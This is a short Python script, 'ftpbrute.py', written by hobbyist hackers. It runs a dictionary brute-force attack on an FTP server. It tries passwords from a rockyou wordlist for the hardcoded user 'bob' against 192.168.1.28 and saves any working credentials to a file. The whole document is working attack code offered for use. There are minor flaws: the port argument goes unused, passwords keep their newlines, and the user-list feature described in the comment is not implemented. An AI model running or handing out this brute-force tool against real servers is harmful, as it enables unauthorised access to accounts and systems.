#!/usr/bin/env python


#ftpbrute.py
#mls577 and noize
#shoutz to suidrewt and #haxme
#ftpbrute is a simple ftp brute force tool that noize and I wrote that will take a single username, or a list of usernames from a file and try them
#along with a specified password file to do a dictionary attack on an ftp server in order to find login credentials

#imports
import socket, sys
import ftplib
from ftplib import FTP

successful_logins = [] #list of successful logins

def connect(user, password, ip_address, port):

    host = ip_address #ftp server address

    try:
        FTP(host, user, password) #attempted ftp connection
        creds = user + ":" + password #format
        with open('./%s/FTP/%s_%s_bruteforce.txt' % (ip_address, ip_address, port), 'w') as f:            
            f.write(creds)

        sys.exit(0)

    except ftplib.error_perm:
        pass

def main(ip_address, port):
    print ("[+] Bruteforcing FTP using (wordlist/rockyou.txt)")
    user = 'bob' #username
    password_file = []

    with open('../modules/wordlist/rockyou2.txt', 'r') as f:
        password_file = f.readlines()


    for password in password_file:
        connect(user, password, ip_address, port) #pass credentials to connect()

if __name__ == '__main__':
    main('192.168.1.28',21)
